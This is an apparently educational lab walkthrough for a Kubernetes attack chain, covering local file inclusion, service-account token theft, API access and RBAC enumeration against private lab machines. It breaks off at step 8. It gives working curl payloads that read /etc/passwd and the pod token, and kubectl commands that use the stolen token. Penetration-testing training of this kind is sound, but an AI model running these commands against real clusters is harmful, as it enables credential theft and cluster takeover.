# K8s-Guard: Attack Chain Walkthrough

Every command below runs from VM3 (Kali), in order.

**Full chain:** LFI → service-account token theft → API access → RBAC
enumeration → privileged pod → container escape → flag capture.

```
VM3 (Kali) ──curl──> VM2:30270 (LFI) ──token──> VM1:6443 (API) ──kubectl──> VM2 (Privileged Pod)
```

### Scenario
An internal penetration tester has network access (they're on the internal
network) but no Kubernetes credentials. They're testing what damage someone
with just network access could do, like a compromised employee laptop.

Targets:
- Webapp / LFI entry point: `192.168.50.11:30270` (VM2 worker)
- Kubernetes API server: `192.168.50.10:6443` (VM1 master)
- Attacker host: `192.168.50.20` (VM3 Kali)

---

## Phase 1: Reconnaissance & Discovery (run from Kali)

**Step 1.** Access the internal document portal.
```bash
curl http://192.168.50.11:30270/
```
Output: HTML page showing "Internal Document Portal v2.1" with links to files.

**Step 2.** Normal use: read a legitimate file.
```bash
curl http://192.168.50.11:30270/read?file=welcome.txt
```
Output: Welcome text. But the `?file=` parameter reads directly from disk.

**Step 3.** Test LFI with a system file.
```bash
curl "http://192.168.50.11:30270/read?file=/etc/passwd"
```
Output: System passwd file. Confirms the app reads ANY file without validation.

**Step 4.** Steal the Kubernetes service account token.
```bash
curl "http://192.168.50.11:30270/read?file=/var/run/secrets/kubernetes.io/serviceaccount/token"
```
Output: A long JWT token string. Every K8s pod has this at a well-known path.

**Step 5.** Save the token and scan for the API server.
```bash
TOKEN=$(curl -s "http://192.168.50.11:30270/read?file=/var/run/secrets/kubernetes.io/serviceaccount/token")
nmap -p 6443 192.168.50.0/24 --open
```
Output: 192.168.50.10 has port 6443 open (standard K8s API port).

**Step 6.** Test cluster access with the stolen token.
```bash
kubectl --server=https://192.168.50.10:6443 --token=$TOKEN --insecure-skip-tls-verify get nodes
```
Output: Both nodes listed as Ready. Token works.

**Step 7.** Enumerate RBAC bindings.
```bash
kubectl ... get clusterrolebindings
```
Output: Long list of system bindings. At the bottom: `vuln-sa-admin` bound to
`cluster-admin`. Suspicious.

**Step 8.** Inspect the binding.
